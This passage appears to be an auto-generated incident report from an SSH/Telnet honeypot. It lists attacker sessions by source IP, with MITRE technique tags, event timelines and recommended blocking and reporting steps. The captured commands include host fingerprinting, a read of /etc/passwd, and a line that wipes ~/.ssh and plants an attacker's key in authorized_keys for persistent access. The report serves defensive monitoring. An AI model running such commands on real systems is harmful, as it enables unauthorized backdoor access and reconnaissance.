| `2026-09-04 07:17:14` | `cowrie.command.input` |
| `2026-09-04 07:17:14` | `cowrie.command.input` |
| `2026-09-04 07:17:18` | `cowrie.log.closed` |
| `2026-09-04 07:17:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aadd924e33ce

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:18 |
| **Last Seen** | 2026-09-04 07:18 |
| **Session Duration** | 38s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:18:18` | `cowrie.session.connect` |
| `2026-09-04 07:18:22` | `cowrie.client.version` |
| `2026-09-04 07:18:22` | `cowrie.client.kex` |
| `2026-09-04 07:18:38` | `cowrie.login.success` |
| `2026-09-04 07:18:47` | `cowrie.session.params` |
| `2026-09-04 07:18:47` | `cowrie.command.input` |
| `2026-09-04 07:18:47` | `cowrie.command.input` |
| `2026-09-04 07:18:47` | `cowrie.command.input` |
| `2026-09-04 07:18:47` | `cowrie.command.input` |
| `2026-09-04 07:18:47` | `cowrie.command.input` |
| `2026-09-04 07:18:47` | `cowrie.command.success` |
| `2026-09-04 07:18:47` | `cowrie.command.input` |
| `2026-09-04 07:18:47` | `cowrie.command.input` |
| `2026-09-04 07:18:47` | `cowrie.command.input` |
| `2026-09-04 07:18:47` | `cowrie.command.input` |
| `2026-09-04 07:18:52` | `cowrie.log.closed` |
| `2026-09-04 07:18:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfe170263419

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:19 |
| **Last Seen** | 2026-09-04 07:20 |
| **Session Duration** | 36s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:19:46` | `cowrie.session.connect` |
| `2026-09-04 07:19:51` | `cowrie.client.version` |
| `2026-09-04 07:19:51` | `cowrie.client.kex` |
| `2026-09-04 07:20:06` | `cowrie.login.success` |
| `2026-09-04 07:20:15` | `cowrie.session.params` |
| `2026-09-04 07:20:15` | `cowrie.command.input` |
| `2026-09-04 07:20:15` | `cowrie.command.input` |
| `2026-09-04 07:20:15` | `cowrie.command.input` |
| `2026-09-04 07:20:15` | `cowrie.command.input` |
| `2026-09-04 07:20:15` | `cowrie.command.input` |
| `2026-09-04 07:20:15` | `cowrie.command.success` |
| `2026-09-04 07:20:15` | `cowrie.command.input` |
| `2026-09-04 07:20:15` | `cowrie.command.input` |
| `2026-09-04 07:20:15` | `cowrie.command.input` |
| `2026-09-04 07:20:15` | `cowrie.command.input` |
| `2026-09-04 07:20:19` | `cowrie.log.closed` |
| `2026-09-04 07:20:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7aca9d5164ae

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-04 07:19 |
| **Last Seen** | 2026-09-04 07:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:19:47` | `cowrie.session.connect` |
| `2026-09-04 07:19:47` | `cowrie.client.version` |
| `2026-09-04 07:19:47` | `cowrie.client.kex` |
| `2026-09-04 07:19:48` | `cowrie.login.success` |
| `2026-09-04 07:19:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8692a88ede56

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-04 07:19 |
| **Last Seen** | 2026-09-04 07:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:19:48` | `cowrie.session.connect` |
| `2026-09-04 07:19:48` | `cowrie.client.version` |
| `2026-09-04 07:19:48` | `cowrie.client.kex` |
| `2026-09-04 07:19:49` | `cowrie.login.success` |
| `2026-09-04 07:19:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cb192af6d1c

| Field | Detail |
|---|---|
| **Source IP** | `156.227.234[.]198` |
| **First Seen** | 2026-09-04 07:20 |
| **Last Seen** | 2026-09-04 07:23 |
| **Session Duration** | 145s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:20:52` | `cowrie.session.connect` |
| `2026-09-04 07:20:52` | `cowrie.telnet.option` |
| `2026-09-04 07:20:54` | `cowrie.telnet.option` |
| `2026-09-04 07:20:54` | `cowrie.login.success` |
| `2026-09-04 07:20:54` | `cowrie.session.params` |
| `2026-09-04 07:23:17` | `cowrie.log.closed` |
| `2026-09-04 07:23:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.227.234[.]198` to AbuseIPDB if not already reported
- [ ] Block `156.227.234[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36b686d9473c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:21 |
| **Last Seen** | 2026-09-04 07:21 |
| **Session Duration** | 35s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:21:06` | `cowrie.session.connect` |
| `2026-09-04 07:21:10` | `cowrie.client.version` |
| `2026-09-04 07:21:10` | `cowrie.client.kex` |
| `2026-09-04 07:21:25` | `cowrie.login.success` |
| `2026-09-04 07:21:33` | `cowrie.session.params` |
| `2026-09-04 07:21:33` | `cowrie.command.input` |
| `2026-09-04 07:21:33` | `cowrie.command.input` |
| `2026-09-04 07:21:33` | `cowrie.command.input` |
| `2026-09-04 07:21:33` | `cowrie.command.input` |
| `2026-09-04 07:21:33` | `cowrie.command.input` |
| `2026-09-04 07:21:33` | `cowrie.command.success` |
| `2026-09-04 07:21:33` | `cowrie.command.input` |
| `2026-09-04 07:21:33` | `cowrie.command.input` |
| `2026-09-04 07:21:33` | `cowrie.command.input` |
| `2026-09-04 07:21:33` | `cowrie.command.input` |
| `2026-09-04 07:21:38` | `cowrie.log.closed` |
| `2026-09-04 07:21:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20dc28b689fb

| Field | Detail |
|---|---|
| **Source IP** | `156.227.234[.]198` |
| **First Seen** | 2026-09-04 07:21 |
| **Last Seen** | 2026-09-04 07:23 |
| **Session Duration** | 64s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id, cat /etc/passwd, echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A", enable, system` |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:21:57` | `cowrie.session.connect` |
| `2026-09-04 07:21:58` | `cowrie.telnet.option` |
| `2026-09-04 07:21:58` | `cowrie.telnet.option` |
| `2026-09-04 07:21:58` | `cowrie.login.success` |
| `2026-09-04 07:21:59` | `cowrie.session.params` |
| `2026-09-04 07:21:59` | `cowrie.telnet.option` |
| `2026-09-04 07:21:59` | `cowrie.telnet.option` |
| `2026-09-04 07:21:59` | `cowrie.command.input` |
| `2026-09-04 07:21:59` | `cowrie.command.input` |
| `2026-09-04 07:21:59` | `cowrie.command.input` |
| `2026-09-04 07:22:00` | `cowrie.command.input` |
| `2026-09-04 07:22:00` | `cowrie.command.failed` |
| `2026-09-04 07:22:00` | `cowrie.command.input` |
| `2026-09-04 07:22:00` | `cowrie.command.failed` |
| `2026-09-04 07:22:00` | `cowrie.command.input` |
| `2026-09-04 07:22:00` | `cowrie.command.failed` |
| `2026-09-04 07:22:00` | `cowrie.command.input` |
| `2026-09-04 07:22:00` | `cowrie.command.input` |
| `2026-09-04 07:22:00` | `cowrie.command.input` |
| `2026-09-04 07:22:00` | `cowrie.command.input` |
| `2026-09-04 07:22:00` | `cowrie.command.failed` |
| `2026-09-04 07:22:00` | `cowrie.command.input` |
| `2026-09-04 07:22:00` | `cowrie.command.failed` |
| `2026-09-04 07:22:00` | `cowrie.command.input` |
| `2026-09-04 07:22:00` | `cowrie.command.failed` |
| `2026-09-04 07:22:00` | `cowrie.command.input` |
| `2026-09-04 07:22:00` | `cowrie.command.failed` |
| `2026-09-04 07:22:00` | `cowrie.command.input` |
| `2026-09-04 07:22:00` | `cowrie.command.input` |
| `2026-09-04 07:22:00` | `cowrie.command.failed` |
| `2026-09-04 07:22:00` | `cowrie.command.input` |
| `2026-09-04 07:22:00` | `cowrie.command.input` |
| `2026-09-04 07:23:02` | `cowrie.log.closed` |
| `2026-09-04 07:23:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.227.234[.]198` to AbuseIPDB if not already reported
- [ ] Block `156.227.234[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e21aa8a071cb

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:22 |
| **Last Seen** | 2026-09-04 07:22 |
| **Session Duration** | 35s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:22:10` | `cowrie.session.connect` |
| `2026-09-04 07:22:14` | `cowrie.client.version` |
| `2026-09-04 07:22:14` | `cowrie.client.kex` |
| `2026-09-04 07:22:29` | `cowrie.login.success` |
| `2026-09-04 07:22:37` | `cowrie.session.params` |
| `2026-09-04 07:22:37` | `cowrie.command.input` |
| `2026-09-04 07:22:37` | `cowrie.command.input` |
| `2026-09-04 07:22:37` | `cowrie.command.input` |
| `2026-09-04 07:22:37` | `cowrie.command.input` |
| `2026-09-04 07:22:37` | `cowrie.command.input` |
| `2026-09-04 07:22:37` | `cowrie.command.success` |
| `2026-09-04 07:22:37` | `cowrie.command.input` |
| `2026-09-04 07:22:37` | `cowrie.command.input` |
| `2026-09-04 07:22:37` | `cowrie.command.input` |
| `2026-09-04 07:22:37` | `cowrie.command.input` |
| `2026-09-04 07:22:42` | `cowrie.log.closed` |
| `2026-09-04 07:22:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63afecb5d6c1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:23 |
| **Last Seen** | 2026-09-04 07:23 |
| **Session Duration** | 35s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:23:14` | `cowrie.session.connect` |
| `2026-09-04 07:23:18` | `cowrie.client.version` |
| `2026-09-04 07:23:18` | `cowrie.client.kex` |
| `2026-09-04 07:23:33` | `cowrie.login.success` |
| `2026-09-04 07:23:41` | `cowrie.session.params` |
| `2026-09-04 07:23:41` | `cowrie.command.input` |
| `2026-09-04 07:23:41` | `cowrie.command.input` |
| `2026-09-04 07:23:41` | `cowrie.command.input` |
| `2026-09-04 07:23:41` | `cowrie.command.input` |
| `2026-09-04 07:23:41` | `cowrie.command.input` |
| `2026-09-04 07:23:41` | `cowrie.command.success` |
| `2026-09-04 07:23:41` | `cowrie.command.input` |
| `2026-09-04 07:23:41` | `cowrie.command.input` |
| `2026-09-04 07:23:41` | `cowrie.command.input` |
| `2026-09-04 07:23:41` | `cowrie.command.input` |
| `2026-09-04 07:23:45` | `cowrie.log.closed` |
| `2026-09-04 07:23:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff37991bf951

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:24 |
| **Last Seen** | 2026-09-04 07:24 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:24:18` | `cowrie.session.connect` |
| `2026-09-04 07:24:21` | `cowrie.client.version` |
| `2026-09-04 07:24:21` | `cowrie.client.kex` |
| `2026-09-04 07:24:36` | `cowrie.login.success` |
| `2026-09-04 07:24:44` | `cowrie.session.params` |
| `2026-09-04 07:24:44` | `cowrie.command.input` |
| `2026-09-04 07:24:44` | `cowrie.command.input` |
| `2026-09-04 07:24:44` | `cowrie.command.input` |
| `2026-09-04 07:24:44` | `cowrie.command.input` |
| `2026-09-04 07:24:44` | `cowrie.command.input` |
| `2026-09-04 07:24:44` | `cowrie.command.success` |
| `2026-09-04 07:24:44` | `cowrie.command.input` |
| `2026-09-04 07:24:44` | `cowrie.command.input` |
| `2026-09-04 07:24:44` | `cowrie.command.input` |
| `2026-09-04 07:24:44` | `cowrie.command.input` |
| `2026-09-04 07:24:48` | `cowrie.log.closed` |
| `2026-09-04 07:24:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a77c2f2e3517

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:25 |
| **Last Seen** | 2026-09-04 07:25 |
| **Session Duration** | 35s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:25:19` | `cowrie.session.connect` |
| `2026-09-04 07:25:23` | `cowrie.client.version` |
| `2026-09-04 07:25:23` | `cowrie.client.kex` |
| `2026-09-04 07:25:39` | `cowrie.login.success` |
| `2026-09-04 07:25:47` | `cowrie.session.params` |
| `2026-09-04 07:25:47` | `cowrie.command.input` |
| `2026-09-04 07:25:47` | `cowrie.command.input` |
| `2026-09-04 07:25:47` | `cowrie.command.input` |
| `2026-09-04 07:25:47` | `cowrie.command.input` |
| `2026-09-04 07:25:47` | `cowrie.command.input` |
| `2026-09-04 07:25:47` | `cowrie.command.success` |
| `2026-09-04 07:25:47` | `cowrie.command.input` |
| `2026-09-04 07:25:47` | `cowrie.command.input` |
| `2026-09-04 07:25:47` | `cowrie.command.input` |
| `2026-09-04 07:25:47` | `cowrie.command.input` |
| `2026-09-04 07:25:51` | `cowrie.log.closed` |
| `2026-09-04 07:25:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f05b7392fc8

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 07:25 |
| **Last Seen** | 2026-09-04 07:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:25:34` | `cowrie.session.connect` |
| `2026-09-04 07:25:34` | `cowrie.client.version` |
| `2026-09-04 07:25:34` | `cowrie.client.kex` |
| `2026-09-04 07:25:35` | `cowrie.login.success` |
| `2026-09-04 07:25:35` | `cowrie.direct-tcpip.request` |
| `2026-09-04 07:25:35` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 07:25:35` | `cowrie.direct-tcpip.data` |
| `2026-09-04 07:25:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a13053f48d3

| Field | Detail |
|---|---|
| **Source IP** | `223.109.49[.]166` |
| **First Seen** | 2026-09-04 07:26 |
| **Last Seen** | 2026-09-04 07:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:26:20` | `cowrie.session.connect` |
| `2026-09-04 07:26:20` | `cowrie.client.version` |
| `2026-09-04 07:26:20` | `cowrie.client.kex` |
| `2026-09-04 07:26:21` | `cowrie.login.success` |
| `2026-09-04 07:26:22` | `cowrie.session.params` |
| `2026-09-04 07:26:22` | `cowrie.command.input` |
| `2026-09-04 07:26:22` | `cowrie.command.failed` |
| `2026-09-04 07:26:23` | `cowrie.log.closed` |
| `2026-09-04 07:26:24` | `cowrie.session.params` |
| `2026-09-04 07:26:24` | `cowrie.command.input` |
| `2026-09-04 07:26:24` | `cowrie.session.file_download` |
| `2026-09-04 07:26:24` | `cowrie.log.closed` |
| `2026-09-04 07:26:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.109.49[.]166` to AbuseIPDB if not already reported
- [ ] Block `223.109.49[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1aa41db6a52e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:26 |
| **Last Seen** | 2026-09-04 07:26 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:26:21` | `cowrie.session.connect` |
| `2026-09-04 07:26:24` | `cowrie.client.version` |
| `2026-09-04 07:26:24` | `cowrie.client.kex` |
| `2026-09-04 07:26:40` | `cowrie.login.success` |
| `2026-09-04 07:26:46` | `cowrie.session.params` |
| `2026-09-04 07:26:46` | `cowrie.command.input` |
| `2026-09-04 07:26:46` | `cowrie.command.input` |
| `2026-09-04 07:26:46` | `cowrie.command.input` |
| `2026-09-04 07:26:46` | `cowrie.command.input` |
| `2026-09-04 07:26:46` | `cowrie.command.input` |
| `2026-09-04 07:26:46` | `cowrie.command.success` |
| `2026-09-04 07:26:46` | `cowrie.command.input` |
| `2026-09-04 07:26:46` | `cowrie.command.input` |
| `2026-09-04 07:26:46` | `cowrie.command.input` |
| `2026-09-04 07:26:46` | `cowrie.command.input` |
| `2026-09-04 07:26:51` | `cowrie.log.closed` |
| `2026-09-04 07:26:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-709e1fb6ecad

| Field | Detail |
|---|---|
| **Source IP** | `223.109.49[.]166` |
| **First Seen** | 2026-09-04 07:26 |
